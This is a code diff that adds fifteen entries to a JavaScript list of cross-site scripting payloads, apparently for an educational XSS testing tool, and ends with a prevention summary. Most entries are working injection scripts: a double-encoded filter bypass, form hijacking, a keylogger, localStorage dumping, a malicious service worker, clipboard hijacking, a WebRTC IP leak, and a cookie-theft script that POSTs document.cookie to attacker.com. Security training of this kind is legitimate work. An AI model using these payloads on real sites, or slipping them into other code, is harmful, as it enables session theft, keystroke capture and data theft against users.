@@ -145,6 +145,258 @@ worker.postMessage('start');
 </script>`,
       category: 'polyglot',
       difficulty: 'Expert'
+    },
+    {
+      id: 16,
+      name: "Filter Bypass - Double Encoding",
+      description: "Uses double URL encoding to bypass input filters",
+      payload: `%253Cscript%253Ealert%2528%2527Double%2520Encoding%2520XSS%2527%2529%253C%252Fscript%253E`,
+      category: 'evasion',
+      difficulty: 'Advanced'
+    },
+    {
+      id: 17,
+      name: "DOM Manipulation",
+      description: "Exploits DOM properties for XSS execution",
+      payload: `<div id="xss"></div><script>document.getElementById('xss').innerHTML='<img src=x onerror=alert("DOM XSS")>'</script>`,
+      category: 'advanced',
+      difficulty: 'Intermediate'
+    },
+    {
+      id: 18,
+      name: "Form Hijacking",
+      description: "Hijacks form submissions to steal data",
+      payload: `<script>
+document.forms[0].onsubmit = function() {
+  alert('Form hijacked! Data: ' + new FormData(this).get('username'));
+  return false;
+};
+</script>`,
+      category: 'advanced',
+      difficulty: 'Advanced'
+    },
+    {
+      id: 19,
+      name: "Session Theft",
+      description: "Attempts to steal user session tokens",
+      payload: `<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://attacker.com/steal', true);
+xhr.send('session=' + document.cookie);
+alert('Session data sent to attacker');
+</script>`,
+      category: 'advanced',
+      difficulty: 'Expert'
+    },
+    {
+      id: 20,
+      name: "Keylogger Injection",
+      description: "Injects a simple keylogger to capture keystrokes",
+      payload: `<script>
+var keys = '';
+document.onkeypress = function(e) {
+  keys += String.fromCharCode(e.which);
+  if (keys.length > 20) {
+    console.log('Captured: ' + keys);
+    keys = '';
+  }
+};
+alert('Keylogger active');
+</script>`,
+      category: 'polyglot',
+      difficulty: 'Expert'
+    },
+    {
+      id: 21,
+      name: "Browser Information Theft",
+      description: "Collects browser and system information",
+      payload: `<script>
+var info = {
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  screen: screen.width + 'x' + screen.height,
+  url: location.href
+};
+alert('Browser Info: ' + JSON.stringify(info, null, 2));
+</script>`,
+      category: 'basic',
+      difficulty: 'Intermediate'
+    },
+    {
+      id: 22,
+      name: "Local Storage Access",
+      description: "Accesses and displays localStorage data",
+      payload: `<script>
+var storage = {};
+for (var i = 0; i < localStorage.length; i++) {
+  var key = localStorage.key(i);
+  storage[key] = localStorage.getItem(key);
+}
+alert('Local Storage: ' + JSON.stringify(storage));
+</script>`,
+      category: 'advanced',
+      difficulty: 'Intermediate'
+    },
+    {
+      id: 23,
+      name: "Audio/Video Hijacking",
+      description: "Attempts to access user's camera/microphone",
+      payload: `<script>
+navigator.mediaDevices.getUserMedia({video: true, audio: true})
+.then(function(stream) {
+  alert('Camera/Microphone access granted!');
+})
+.catch(function(err) {
+  alert('Media access denied: ' + err);
+});
+</script>`,
+      category: 'advanced',
+      difficulty: 'Expert'
+    },
+    {
+      id: 24,
+      name: "Geolocation Tracking",
+      description: "Attempts to access user's location",
+      payload: `<script>
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    alert('Location: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+  },
+  function(err) {
+    alert('Location access denied: ' + err.message);
+  }
+);
+</script>`,
+      category: 'advanced',
+      difficulty: 'Advanced'
+    },
+    {
+      id: 25,
+      name: "WebRTC IP Leak",
+      description: "Attempts to discover user's real IP address",
+      payload: `<script>
+var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("");
+pc.createOffer().then(offer => pc.setLocalDescription(offer));
+pc.onicecandidate = function(ice) {
+  if (ice.candidate) {
+    var ip = ice.candidate.candidate.split(' ')[4];
+    if (ip && ip.match(/\d+\.\d+\.\d+\.\d+/)) {
+      alert('Detected IP: ' + ip);
+    }
+  }
+};
+</script>`,
+      category: 'polyglot',
+      difficulty: 'Expert'
+    },
+    {
+      id: 26,
+      name: "CSRF Token Bypass",
+      description: "Attempts to bypass CSRF protection",
+      payload: `<script>
+fetch('/api/user/profile', {method: 'GET'})
+.then(response => response.text())
+.then(html => {
+  var token = html.match(/csrf-token['"]\s*content=['"]([^'"]+)/);
+  if (token) alert('CSRF Token found: ' + token[1]);
+});
+</script>`,
+      category: 'evasion',
+      difficulty: 'Expert'
+    },
+    {
+      id: 27,
+      name: "HTML5 WebSQL Injection",
+      description: "Exploits deprecated WebSQL for data access",
+      payload: `<script>
+if (window.openDatabase) {
+  var db = openDatabase('', '', '', '');
+  db.transaction(function(tx) {
+    tx.executeSql('SELECT * FROM sqlite_master', [], function(tx, results) {
+      alert('WebSQL Tables: ' + results.rows.length);
+    });
+  });
+}
+</script>`,
+      category: 'evasion',
+      difficulty: 'Advanced'
+    },
+    {
+      id: 28,
+      name: "Service Worker Hijack",
+      description: "Registers malicious service worker",
+      payload: `<script>
+if ('serviceWorker' in navigator) {
+  var blob = new Blob([
+    'self.addEventListener("fetch", e => e.respondWith(new Response("Hijacked by XSS")))'
+  ], {type: 'application/javascript'});
+  navigator.serviceWorker.register(URL.createObjectURL(blob));
+  alert('Malicious service worker registered');
+}
+</script>`,
+      category: 'polyglot',
+      difficulty: 'Expert'
+    },
+    {
+      id: 29,
+      name: "Clipboard Hijacking",
+      description: "Hijacks clipboard operations",
+      payload: `<script>
+document.addEventListener('copy', function(e) {
+  e.clipboardData.setData('text/plain', 'Hijacked: ' + window.getSelection().toString());
+  e.preventDefault();
+});
+navigator.clipboard.writeText('XSS Clipboard Hijack').then(() => {
+  alert('Clipboard hijacked');
+});
+</script>`,
+      category: 'advanced',
+      difficulty: 'Advanced'
+    },
+    {
+      id: 30,
+      name: "Educational Summary",
+      description: "Comprehensive XSS prevention guide",
+      payload: `<!-- XSS PREVENTION TECHNIQUES:
+
+1. INPUT VALIDATION:
+   - Whitelist allowed characters
+   - Validate data types and formats
+   - Reject suspicious patterns
+
+2. OUTPUT ENCODING:
+   - HTML entity encoding (&lt; &gt; &amp;)
+   - JavaScript encoding (\x3c \x3e)
+   - URL encoding (%3C %3E)
+   - CSS encoding (\\3c \\3e)
+
+3. CONTENT SECURITY POLICY (CSP):
+   - Content-Security-Policy: default-src 'self'
+   - Blocks inline scripts and eval()
+   - Restricts resource loading
+
+4. SECURE CODING PRACTICES:
+   - Use parameterized queries
+   - Avoid innerHTML, use textContent
+   - Validate server-side always
+   - Use frameworks with built-in protection
+
+5. TESTING METHODS:
+   - Manual payload testing
+   - Automated security scanners
+   - Code review processes
+   - Penetration testing
+
+Remember: XSS can lead to account hijacking, data theft, 
+malware distribution, and complete site compromise!
+-->
+<script>
+alert('Educational XSS Summary - Always test responsibly!');
+</script>`,
+      category: 'basic',
+      difficulty: 'Beginner'
     }
   ];
 
